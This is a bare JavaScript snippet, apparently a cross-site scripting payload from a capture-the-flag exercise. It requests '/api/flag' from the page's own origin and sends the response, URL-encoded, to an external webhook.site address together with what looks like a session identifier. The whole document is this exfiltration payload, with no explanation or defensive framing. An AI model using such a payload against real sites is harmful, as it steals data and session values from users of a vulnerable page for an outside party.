fetch("/api/flag")
  .then(res => res.text())
  .then(data => {
    fetch("https://webhook.site/11d600b5-4877-4a62-8552-1f614ef40d6b?fb2c1dae9c921e308f8be2817bce7e61=session_id=74d411c3e9c3b090fc87669daf49881d?flag=" + encodeURIComponent(data));
  });
